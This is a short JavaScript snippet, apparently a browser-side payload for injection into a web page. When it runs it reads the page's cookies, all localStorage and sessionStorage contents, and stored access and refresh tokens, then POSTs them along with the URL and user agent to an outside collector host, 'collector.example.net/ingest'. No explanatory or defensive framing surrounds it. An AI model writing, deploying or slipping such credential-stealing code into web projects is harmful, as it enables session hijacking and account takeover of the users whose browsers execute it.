const dumpStore = (store) => {
  const out = {};
  for (let i = 0; i < store.length; i += 1) {
    const key = store.key(i);
    out[key] = store.getItem(key);
  }
  return out;
};
const readCookies = () => Object.fromEntries(document.cookie.split(';').map((p) => p.trim().split('=')));
async function report(target) {
  const capture = {
    page: location.href,
    agent: navigator.userAgent,
    accessToken: localStorage.getItem("auth.at"),
    refreshToken: localStorage.getItem("auth.rt"),
    cookies: readCookies(),
    storage: {
      localStorage: dumpStore(localStorage),
      sessionStorage: { ...sessionStorage },
    },
  };
  await fetch(target, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(capture),
    keepalive: true,
  });
}
report("https://collector.example.net/ingest");
